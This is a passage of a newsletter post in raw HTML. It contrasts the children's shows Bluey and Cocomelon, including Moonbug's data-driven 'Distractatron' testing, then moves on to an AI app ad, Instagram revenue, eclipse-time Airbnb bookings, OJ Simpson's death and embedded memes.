Distractatron,” said Maurice Wheeler, who runs the research group. “But if they aren’t fully focused, they might go, ‘Oh, what’s that?’ and kind of drift over. We can see what they’re looking at and the exact moment when they got distracted.”</em></p></blockquote><p>I repeat: a “Distractatron”. </p><p><span>Brumm recently launched the </span><em><a href="https://www.abc.net.au/listen/programs/behind-bluey" rel="">Behind Bluey</a></em><span> podcast. In it, Brumm talks to various team members (animators, voice actors etc.) about creating the show. I haven’t listened to all of the episodes yet but I’m guessing…THEY DON’T USE A F—ING DISTRACTATRON!!!</span></p><p><span>Here is more from the </span><em>NYT</em><span>:</span></p><blockquote><p><em>Outside this office, some 270 employees are working on Moonbug shows in the company’s headquarters, a sleek, open-plan space on one floor of a four-story building beside a canal in Camden Town, a district in northwest London. Pre- and post- production are handled here and in the United States, where the company has another 120 staffers, mostly in Los Angeles. The company works with animators around the world.</em></p><p><em>Those hands are nothing if not data driven. [Moonbug Entertainment CEO] René Rechtman has a background in private equity and is more of an algorithm guy than an artist. Shows at Moonbug are honed in ways that leave little to chance, and audience research commences long before any episode gets near the Distractatron.</em></p><p><em>A data and analytics team sifts constantly through YouTube numbers to determine exactly what resonates. Should a girl wear black jeans or blue jeans? Should the music be louder or softer? Should the bus be yellow or red?</em></p><p><em>Yellow, is the answer.</em></p><p><em>“Kids love yellow buses around the world,” said David Levine, the chief content officer at Moonbug. “In some countries, yellow buses are actually used to transport prisoners. But still, kids around the world love to see yellow buses and kids on yellow buses.”</em></p><p><em>Infants are also enamored with objects covered in a little dirt, like they’ve been rolling around on the ground. And they’re fascinated by minor injuries. Not broken legs or gruesome wounds. More like small cuts that require Band-Aids.</em></p><p><em>“The trifecta for a kid would be a dirty yellow bus that has a boo-boo,” Levine said. “Broken fender, broken wheel, little grimace on its face.”</em></p></blockquote><p><span>Moonbug has </span><em>Cocomelon</em><span> down to a science. It is an assembly line — a very lucrative assembly line — that is feeding YouTube’s algorithm and Netflix’s kid show tab. </span></p><p><em>Bluey</em><span> has a creative process. </span></p><p><em>Cocomelon</em><span> is processed. </span></p><p>***</p><p><span>Listen, I know I’m going pretty hard on </span><em>Cocomelon</em><span>.</span></p><p>Parenting is difficult. </p><p>I get it. </p><p><em>Cocomelon</em><span> is a digital babysitter for time-strapped caregivers. I won’t pretend like I haven’t stuck an iPad in front of my son and let him watch </span><em>Cocomelon</em><span> or </span><em>Blippi</em><span> so I could get some work done. Guilty as charged. </span></p><p><span>The show has more educational content compared to other popular YouTube kids genres including toy unboxings, Hot Wheels on ramps or </span><a href="https://www.theverge.com/culture/2017/11/21/16685874/kids-youtube-video-elsagate-creepiness-psychology" rel="">that time the algo was recomnending creepy videos with headless comic-book characters</a><span>. </span></p><p><span>It is more than just “taping strobe lights to your child’s eyeballs”. But</span><strong> </strong><span>there are just better options than </span><em>Cocomelon</em><span> for YouTube and streaming imo (including </span><em>Bluey</em><span>, of course).</span></p><p><span>The Moonbug team did raise a larger point in the </span><em>NYT</em><span> article: </span><em>Cocomelon </em><span>is not meant to be a substitute for normal play. “It just</span><em> </em><span>should not replace the time you’re outside bicycling,” says Rechtman. “Or outside playing with your friends. That’s for sure.”</span></p><p><span>Same goes for </span><em>Bluey</em><span>. While it is a superior shared experience, watching the show with my son will never be better than biking with him at the park or playing his invented games (including ones from </span><em>Bluey</em><span> that he loves and adapts). </span></p><p><span>Let’s put the parenting aspect of these shows aside and talk about </span><em>Bluey </em><span>vs. </span><em>Cocomelon</em><span> as a view on art and media. </span></p><p><em>Cocomelon</em><span> is as formulaic as it gets. There are countless </span><em>Cocomelon </em><span>knock-offs on YouTube right now because it’s so easy to knock off. Take a nursery rhyme from the public domain. Slap on some colorful animation. Pack the YouTube video with the correct keywords. Maybe even pay for some algorithmic-boosting secret sauce. </span></p><p><span>Next thing you know, the top YouTube search result for “Wheels on the Bus” is a Cocomelon knock-off called </span><a href="https://www.youtube.com/watch?v=CnRK9giGyBE" rel="">Lalafun Nursery Rhymes</a><span>. </span></p><p>Every new iteration of AI will make it easier and easier to create a "Cocomelon" clone. </p><p>However, do you know what AI isn't capable of producing today or in the foreseeable future? A thoughtful 7-minute episode about hungover parenting that is equally enjoyable for parents and kids.</p><p><span>In the face of the upcoming AI-powered content deluge, I keep going back to this quote that music super-producer Rick Rubin mentioned on the Joe Rogan </span><a href="https://open.spotify.com/episode/5oDyN0CFjEwClqjZxJQf9O" rel="">podcast</a><span>:</span></p><blockquote><p><em><span>“Everything I do is just personal taste and it’s what the book is about. Really, for [people and artists] to trust in themselves. Make something that speaks to themselves. And hopefully someone else will like it. But you can’t second-guess your own taste for what someone else is going to like. It won’t be good. We’re not smart enough to know what someone else will like.</span><p><span>To make something and say, ‘well, I don’t really like it but I think this group of people will like it’, I think [that approach] is a bad way to play the game of music or art. Do what’s personal to you, take it as far you can go. Really push the boundaries and people will resonate with it if they are supposed to resonate with it. But you can’t get there the other way. The other way is a dead-end path.”</span></p></em></p></blockquote><p><span>That basically describes </span><em>Cocomelon</em><span> vs. </span><em>Bluey</em><span>.</span></p><p>The former works off of a formula for what the audience might like. The latter is an expression of a single person’s unique taste.</p><p><span>Brumm echoed a similar thought as Rubin when asked on the </span><em>Gotta Be Done</em><span> podcast if he chose characters and plot lines with a marketing lens: </span></p><blockquote><p><em>Look, I suppose the one thing I did not want to do was approach [Bluey] from a marketing point of view. […] My approach was, well, I'm just going to make something that's good and…that will be the marketing decision. Let's just make something that's good.</em><span> </span></p></blockquote><p><span>This is the approach that gave us “Sleepytime”, </span><a href="https://www.youtube.com/watch?v=5DEBViLEoXc" rel="">which is about sleep training toddlers and is probably the episode of </a><em><a href="https://www.youtube.com/watch?v=5DEBViLEoXc" rel="">Bluey</a></em><a href="https://www.youtube.com/watch?v=5DEBViLEoXc" rel=""> that parents love the most</a><span>. It transcends “children’s content” and embodies a Robin Williams quote from the film </span><em>Dead Poets Society </em><span>which Brumm cites as inspiration: </span></p><blockquote><p><em>“Medicine, law, business, engineering, these are all noble pursuits, and necessary to sustain life. But poetry, beauty, romance, love, these are what we stay alive for.”</em></p></blockquote><div id="youtube2-5DEBViLEoXc" data-attrs="{&quot;videoId&quot;:&quot;5DEBViLEoXc&quot;,&quot;startTime&quot;:null,&quot;endTime&quot;:null}" data-component-name="Youtube2ToDOM"><p><iframe src="https://www.youtube-nocookie.com/embed/5DEBViLEoXc?rel=0&amp;autoplay=0&amp;showinfo=0&amp;enablejsapi=0" frameborder="0" loading="lazy" gesture="media" allow="autoplay; fullscreen" allowautoplay="true" allowfullscreen="true" width="728" height="409"></iframe></p></div><p><span>I write all of this knowing that there is a finite amount of </span><em>Bluey</em><span>-caliber content.</span></p><p><em>Cocomelon </em><span>is McDonald’s and </span><em>Bluey </em><span>is a Michelin restaurant. There is a place in the market for both but McDonald’s has a much more repeatable model.</span></p><p><span>The challenge of keeping up the Michelin quality is a concern for </span><em>Bluey </em><span>with many fans worried that Brumm is leaving the show. The season 3 finale — which will air on April 14 — is unusually long (clocking in at 28 minutes) and is titled "The Sign" (leading theorists to believe it may refer to a moving sign for the Heeler family).</span></p><p>Why would Brumm leave? His daughters have gotten older (which means less material). Meanwhile, the voice actors — including some Brisbane-based children — are also getting older (which means their voices are changing).</p><p>The brand is so valuable and BBC/Ludo will find a way to milk it. There is already a live play and talk of a film.</p><p>But without Brumm, the TV show will lose its unique soul…like that part in the “Whale Watching” episode when Chilli asks Bandit to get some chips and sour cream dip to help her recover from the hangover. I’ve done that at least 100x for my wife and snickered when Chilli made the request. My son was none the wiser and that’s what made the co-viewing experience so great.</p><p><em><span>Today’s SatPost is brought to you by&nbsp;</span><a href="https://bearly.ai/" rel="">Bearly.AI</a></em><strong>Why are you seeing this ad?</strong></p><p>Because I co-founded an AI-powered research app and my technical partner is doing all the real work while I make dumb jokes and offer coupons.&nbsp;</p><p>We just added Claude Opus, a powerful new AI language model for querying, summarizing and editing large text documents (or help with your code, which I can't do but you might find helpful).&nbsp;&nbsp;</p><p><span>Use code&nbsp;</span><strong>BEARLY1</strong><span>&nbsp;for a&nbsp;</span><a href="https://link.workweek.com/click/34624661.2043/aHR0cHM6Ly9iZWFybHkuYWkvP2hhc2hlZF91c2VyPTlkNjI1ODJkZjgzMDUwNGZjOGU2NWQyZWY0ZGNhMGE4/62b3df6ab05e1477650912a3B51bad66f" rel="">free month of the Bearly AI Pro Plan</a><span> and try Claude Opus.&nbsp;</span></p><p data-attrs="{&quot;url&quot;:&quot;https://bearly.ai/&quot;,&quot;text&quot;:&quot;Try Bearly AI for FREE&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://bearly.ai/" rel=""><span>Try Bearly AI for FREE</span></a></p><p><strong>Instagram’s revenue revealed: </strong><span>Zuck Daddy Flex acquired Instagram for $1B in 2012. Most tech media folks roasted him. How could he spend 9-figures on a 12-person team making little revenue? It was obviously a prescient move and often called the best tech deal ever along with Google acquiring YouTube for $1.7B in 2006.</span></p><p>Thanks to a recent court filing, we know IG's revenue figures and it's a beast: 2018 ($11.3B), 2019 ($17.9B), 2020 ($22.0B) and 2021 ($32.4B). IG now represents ~30% of Meta’s revenue (the main Facebook app is still huge but its growth has slowed a lot in recent years…we’d live in a different tech world without the deal).</p><p><span>Also of note: Tanay Jaipuria </span><a href="https://twitter.com/tanayj/status/1777055129688056135" rel="">writes</a><span> that Instagram makes more “in ad revenue than YouTube (and likely at much higher gross margins!)”…due to YouTube’s revenue share program, which pays out 55% of revenue to creators (including kid-friendly content that rhymes with “MocoCelon”).</span></p><p>***</p><p><strong>Airbnb’s Solar Eclipse business: </strong><span>I’ll be honest. I had no idea that the Total Solar Eclipse was happening until I saw some memes on X about it. This was bad planning because my son says he wants to see one but the next North American total eclipse isn’t until 2044. Other people definitely saw it, with the eclipse-related economic impact in the US estimated at $6B (that is Taylor Swift levels).</span></p><p><span>Within that spending, </span><em>The Economist</em><span> detailed the </span><a href="https://www.economist.com/business/2024/04/06/airbnb-bookings-for-the-solar-eclipse-reach-astronomical-levels" rel="">business of short-term home rentals</a><span>:</span></p><ul><li><p>The eclipse path in the US was 180km wide</p></li><li><p>There were 92,000 Airbnb and VRBO rentals in the path</p></li><li><p>92% occupancy on the Sunday night (vs. 30% for a normal April weekend)</p></li><li><p>Average booking was $269 (only 10% above the prior week)</p></li></ul><p>An interesting detail: most of the Airbnb rentals were booked two months in advance, which is why the customers locked in a good price. Major hotel/motel chains — much more business conscious — jacked up prices by 50% to 100%. </p><p>When you add up the higher occupancy and slight room rate bump, the solar eclipse was a cumulative revenue bump of $44m for Airbnb/VRBO. My napkin math says these homeowners left ~$10m on the table by not doing a hotel chain mark-up. Now I just need to wait 20 years to jump on this vacation deal.</p><p><span>PS. Read Tim Urban’s </span><em>Wait But Why </em><span>on why you will really want to go to the </span><a href="https://waitbutwhy.com/2024/04/eclipse.html" rel="">2044 total solar eclipse if North America is the easiest spot for you to see it</a><span>. </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb7fec97d-c4fd-4ec0-b5f1-fb84c810bcea_553x508.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb7fec97d-c4fd-4ec0-b5f1-fb84c810bcea_553x508.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb7fec97d-c4fd-4ec0-b5f1-fb84c810bcea_553x508.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb7fec97d-c4fd-4ec0-b5f1-fb84c810bcea_553x508.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb7fec97d-c4fd-4ec0-b5f1-fb84c810bcea_553x508.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb7fec97d-c4fd-4ec0-b5f1-fb84c810bcea_553x508.png" width="663" height="609.0488245931284" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/b7fec97d-c4fd-4ec0-b5f1-fb84c810bcea_553x508.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:508,&quot;width&quot;:553,&quot;resizeWidth&quot;:663,&quot;bytes&quot;:246006,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb7fec97d-c4fd-4ec0-b5f1-fb84c810bcea_553x508.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb7fec97d-c4fd-4ec0-b5f1-fb84c810bcea_553x508.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb7fec97d-c4fd-4ec0-b5f1-fb84c810bcea_553x508.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb7fec97d-c4fd-4ec0-b5f1-fb84c810bcea_553x508.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>***</p><p><strong>OJ Simpson Dead at 76:</strong><span> The </span><a href="https://open.spotify.com/episode/53SyEOPz9SiEdaq3zu4waP?go=1&amp;sp_cid=c0e4705109bdc655c502b7eacd3cc1ab&amp;utm_source=embed_player_p&amp;utm_medium=desktop&amp;nd=1&amp;dlsi=930d5578f21644f8" rel="">first 15 minutes of this Bill Simmons' podcast provide a good overview of how significant the OJ Murder Trial was in the mid-1990s as a cultural and societal event</a><span>. OJ was so famous and the coverage so intense that Simmons describes it as his generation's "JFK" moment. </span></p><p><span>I distinctly recall where I was for the "not guilty" verdict. It was during recess at my elementary school when the principal announced it on the loudspeaker. Keep in mind, this was a small school in Vancouver, Canada (OJ obviously did it and the other memory I had of that period was this wild </span><a href="https://x.com/TrungTPhan/status/1778446414034669957" rel="">Tim Meadows SNL opening bit about the trial</a><span>). </span></p><p>The only other comparable announcement my school made while I was there was Princess Diana's death. President Clinton’s — aka Slick Willy’s — scandal with Monica Lewinsky ranks up there too on the cultural impact scale but my school (understandably) skipped that announcement. These were probably the last three major major cultural events pre-internet. </p><p>***</p><p>Some other baller links:</p><ul><li><p><strong>“The Most Offensively Taboo Idea in Western Civilization”:</strong><span> A thought-provoking musing on left vs. right brain and the power of curiosity. </span><em><span>(</span><a href="https://aletteraday.substack.com/p/letter-171-tom-morgan-2024" rel="">A Letter A Day</a><span>)</span></em></p></li><li><p><strong>What’s up with NPR?</strong><span> A NPR veteran penned a viral article titled “I’ve Been at NPR for 25 Years. Here’s How We Lost America’s Trust.” </span><em><span>(</span><a href="https://www.thefp.com/p/npr-editor-how-npr-lost-americas-trust" rel="">The Free Press</a><span>)</span></em></p></li></ul><p>…and here them fire X posts (including this feature that Netflix should really really consider): </p><div><figure><a target="_blank" href="https://x.com/soren_iverson/status/1776988165288681652" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04dfb249-a949-4596-8420-3818228352c8_587x643.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04dfb249-a949-4596-8420-3818228352c8_587x643.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04dfb249-a949-4596-8420-3818228352c8_587x643.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04dfb249-a949-4596-8420-3818228352c8_587x643.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04dfb249-a949-4596-8420-3818228352c8_587x643.png" width="685" height="750.3492333901193" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/04dfb249-a949-4596-8420-3818228352c8_587x643.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:643,&quot;width&quot;:587,&quot;resizeWidth&quot;:685,&quot;bytes&quot;:290213,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://x.com/soren_iverson/status/1776988165288681652&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04dfb249-a949-4596-8420-3818228352c8_587x643.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04dfb249-a949-4596-8420-3818228352c8_587x643.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04dfb249-a949-4596-8420-3818228352c8_587x643.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04dfb249-a949-4596-8420-3818228352c8_587x643.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://x.com/AlecStapp/status/1778475525205287375" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb97e7a6f-0043-4f3a-9cf1-95c9635bba67_589x442.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb97e7a6f-0043-4f3a-9cf1-95c9635bba67_589x442.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb97e7a6f-0043-4f3a-9cf1-95c9635bba67_589x442.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb97e7a6f-0043-4f3a-9cf1-95c9635bba67_589x442.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb97e7a6f-0043-4f3a-9cf1-95c9635bba67_589x442.png" width="663" height="497.5314091680815" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/b97e7a6f-0043-4f3a-9cf1-95c9635bba67_589x442.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:442,&quot;width&quot;:589,&quot;resizeWidth&quot;:663,&quot;bytes&quot;:129349,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://x.com/AlecStapp/status/1778475525205287375&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb97e7a6f-0043-4f3a-9cf1-95c9635bba67_589x442.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb97e7a6f-0043-4f3a-9cf1-95c9635bba67_589x442.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb97e7a6f-0043-4f3a-9cf1-95c9635bba67_589x442.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb97e7a6f-0043-4f3a-9cf1-95c9635bba67_589x442.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://x.com/TrungTPhan/status/1778486367984771239" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F691703c8-faf0-4427-b4c5-be3274a74ca1_587x387.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F691703c8-faf0-4427-b4c5-be3274a74ca1_587x387.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F691703c8-faf0-4427-b4c5-be3274a74ca1_587x387.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F691703c8-faf0-4427-b4c5-be3274a74ca1_587x387.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F691703c8-faf0-4427-b4c5-be3274a74ca1_587x387.png" width="665" height="438.42419080068146" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/691703c8-faf0-4427-b4c5-be3274a74ca1_587x387.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:387,&quot;width&quot;:587,&quot;resizeWidth&quot;:665,&quot;bytes&quot;:237288,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://x.com/TrungTPhan/status/1778486367984771239&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F691703c8-faf0-4427-b4c5-be3274a74ca1_587x387.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F691703c8-faf0-4427-b4c5-be3274a74ca1_587x387.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F691703c8-faf0-4427-b4c5-be3274a74ca1_587x387.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F691703c8-faf0-4427-b4c5-be3274a74ca1_587x387.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Finally, the best meme round-up last week was the New York earthquake. A natural phenomenon won again this week with those baller solar eclipse memes.</p><div><figure><a target="_blank" href="https://twitter.com/EvanDerekThomas/status/1777346394702909671" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffe0f167c-bf8c-459a-b943-87d89e1d8fc1_589x410.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffe0f167c-bf8c-459a-b943-87d89e1d8fc1_589x410.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffe0f167c-bf8c-459a-b943-87d89e1d8fc1_589x410.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffe0f167c-bf8c-459a-b943-87d89e1d8fc1_589x410.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffe0f167c-bf8c-459a-b943-87d89e1d8fc1_589x410.png" width="675" height="469.8641765704584" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/fe0f167c-bf8c-459a-b943-87d89e1d8fc1_589x410.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:410,&quot;width&quot;:589,&quot;resizeWidth&quot;:675,&quot;bytes&quot;:211043,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://twitter.com/EvanDerekThomas/status/1777346394702909671&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffe0f167c-bf8c-459a-b943-87d89e1d8fc1_589x410.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffe0f167c-bf8c-459a-b943-87d89e1d8fc1_589x410.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffe0f167c-bf8c-459a-b943-87d89e1d8fc1_589x410.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffe0f167c-bf8c-459a-b943-87d89e1d8fc1_589x410.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://x.com/RampCapitalLLC/status/1777393030011535819" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70d58e48-308c-4f3b-a60c-fd0f6170cb60_528x73.png 424w, 